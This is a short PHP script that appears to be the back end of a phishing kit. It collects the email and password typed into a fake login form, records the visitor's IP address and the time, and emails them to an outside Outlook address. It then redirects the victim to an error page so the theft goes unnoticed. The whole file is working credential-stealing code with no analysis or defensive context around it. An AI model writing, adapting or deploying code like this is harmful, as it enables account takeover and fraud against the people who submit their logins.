<?php

$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");

$msg = "---------------------------------------------------------------------------\n";
$msg .= "New Login Info\n";
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Email : ".$_POST['email']."\n";
$msg .= "Password : ".$_POST['pass']."\n";
$msg .= "---------------------------------------------------------------------------\n";
$msg .= "Sent from $ip on $time\n";
$msg .= "---------------------------------------------------------------------------\n";
 
if (! empty($_POST))
{
   

$to = "sommydoller22@outlook.com";
$subject = "l New Login ";
$from = "From: Login";

mail($to,$subject,$msg,$from);
 
header("Location: lerror.php");

}

?>